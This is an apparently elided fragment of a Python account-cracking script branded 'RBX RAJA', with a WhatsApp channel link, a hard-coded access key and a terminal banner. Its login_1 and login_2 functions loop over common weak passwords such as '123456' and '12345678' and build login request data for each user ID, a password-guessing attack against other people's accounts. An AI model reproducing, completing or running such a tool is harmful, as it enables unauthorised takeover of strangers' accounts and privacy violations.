...
channel_link = "https://chat.whatsapp.com/HT3wNM634iaDR4qxHIbD1f?mode=ems_copy_t"

# Valid keys (channel par available hogi)
approved_keys = ["TERA-BAAP-RAJA-HU-MC-2025"]
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【RBX RAJA】𓆪 \x07')


    # RAJA XWD Logo - Speed - Version 2.5
def ____banner____():
...
def login_1(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123123', '1234567890', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
...
def login_2(uid):
    ...
    for pw in ('123456', '123123', '1234567', '12345678', '1234567890', '123456789'):
        try:
